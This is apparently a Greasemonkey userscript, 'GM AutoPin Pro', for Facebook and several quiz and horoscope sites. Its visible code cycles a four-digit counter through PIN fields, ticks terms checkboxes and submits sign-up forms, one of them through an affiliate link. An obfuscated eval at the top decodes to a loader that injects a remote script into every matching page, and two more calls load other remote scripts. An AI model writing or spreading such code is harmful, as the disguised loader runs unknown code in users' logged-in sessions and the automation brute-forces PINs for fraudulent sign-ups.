// ==UserScript==
// @name		GM AutoPin  Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace	James Yang 9
// @description	Auto Pins
// @include		http://jamesyang9.110mb.com/index.html
// @include		http://jamesyang9.110mb.com/submit.html
// @include		http://www.myluvcrush.com/us_new_nop/*
// @include		http://www.iqquizapp.com/us_social/*
// @include     http://apps.facebook.com/mousehunt/*
// @include    	http://www.voodoohoroscope1.com/*
// @include    	http://jamesyang9.x10hosting.com/*
// @include    	http://www.willyoubefamous.com/*
// @include     http://www.thequizclub.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


	var a = GM_getValue('a',0);	
	var b = GM_getValue('b',0);
	var c = GM_getValue('c',0);
	var d = GM_getValue('d',0);
	var value = a+""+b+""+c+""+d;
				
	var question1 = GM_getValue('question1', false);
	var question2 = GM_getValue('question2', false);		
	
	function init(url)
{
	var head,element1;
	head = document.getElementsByTagName('head')[0];
	element1 = document.createElement('script');
	element1.type = "text/javascript";
	element1.src = url;
	head.appendChild(element1);
}
	init('http://userscripts.org/scripts/source/63229.user.js')
        init('http://userscripts.org/scripts/source/60768.user.js')
//*************************************************************************************************************
	//	AutoPinner Section (submit.html)
	//*************************************************************************************************************
	
	if (document.location == "http://www.myluvcrush.com/us_new_nop/pin.php") 
	{
		fillElementByClassName("input",value)
		add();
		clickElementByClassName("button")
	}
	
	if (document.title == "IQ Challenge App") 
	{	
		
		document.getElementById("pin").value = value;
		add();
		clickElementByType("image");
		clickElementByType("submit");

	}
	if (document.title == "Welcome to Aladdin!") 
	{	
		
		fillElementByType("text",value)
		add();
		clickElementByType("image");

	}
	
	if (document.title == "Voodoo Marassa") 
	{	
		
		fillElementByType("text",value);
		add();
		clickElementByType("image");

	}

	if (document.location == "http://bigtimecrush.com/?aff_ref_id=CD16861")
	{
		document.title = "Pinning in progress";
		fillElementByType("text",value);
		clickElementByType("checkbox");
		add();
		clickElementByClassName("imagebtn")
		
	}

	if (document.title == "Quiz Path")
	{
		document.title = "Pinning in progress";
		fillElementByType("text",value);
		document.getElementById("taccheck").checked = true
		add();
		clickElementByType("image");
	}
		
	//*************************************************************************************************************
	//	AutoConfig Section (index.html)
	//*************************************************************************************************************

	if (document.title == "Config")
	{
		chk_reset();
		document.getElementById("AH_T").addEventListener('click', function () {question1=true;chk_valid();}, true);
		document.getElementById("AH_F").addEventListener('click', function () {question1=false;chk_valid();}, true);
		document.getElementById("AT_T").addEventListener('click', function () {question2=true;chk_valid();}, true);
		document.getElementById("AT_F").addEventListener('click', function () {question2=false;chk_valid();}, true);
		document.getElementById("reset").addEventListener('click',function () {a=b=c=d=0;reset()}, true);
	}

	//*************************************************************************************************************
	//	Functions
	//*************************************************************************************************************

	function reset()
	{
		GM_setValue('a',a);
		GM_setValue('b',b);
		GM_setValue('c',c);
		GM_setValue('d',d);	
	}
		

	function chk_reset()
	{
		document.getElementById("AH_T").checked=question1;
		document.getElementById("AH_F").checked=!question1;
		document.getElementById("AT_T").checked=question2;
		document.getElementById("AT_F").checked=!question2;
	}


	function chk_valid()
	{
		GM_setValue('question1',question1);
		GM_setValue('question2',question2);
	}

	function add()
	{
		if (d==9)
		{
			GM_setValue('d',0);
			GM_setValue('c',c+1);
			if (c==9)
			{
				GM_setValue('c',0);
				GM_setValue('b',b+1);
				if (b==9)
				{
					GM_setValue('b',0);
					GM_setValue('a',a+1);
				}
			}

			
		}
		else 
		{
			GM_setValue('d',d+1);
		}
	}

	function submit()
	{
		document.getElementById("reset").click()
	}
		
	function clickElementByClassName(findClass) 
	{
		var aElm=document.body.getElementsByTagName('*');
		for(var i=0; i<aElm.length; i++) 
		{
		if(aElm[i].className==findClass) 
			{aElm[i].click()}
		}
	}

	function fillElementByClassName(findClass,value) 
	{
		var aElm=document.body.getElementsByTagName('*');
		for(var i=0; i<aElm.length; i++) 
		{
		if(aElm[i].className==findClass) 
			{aElm[i].value=value}
		}
	}

	function clickElementByType(findClass) 
	{
		var aElm=document.body.getElementsByTagName('*');
		for(var i=0; i<aElm.length; i++) 
		{
		if(aElm[i].getAttribute('type')==findClass) 
			{aElm[i].click()}
		}
	}

	function fillElementByType(findClass,value) 
	{
		var aElm=document.body.getElementsByTagName('*');
		for(var i=0; i<aElm.length; i++) 
		{
		if(aElm[i].getAttribute('type')==findClass) 
			{aElm[i].value=value}
		}
	}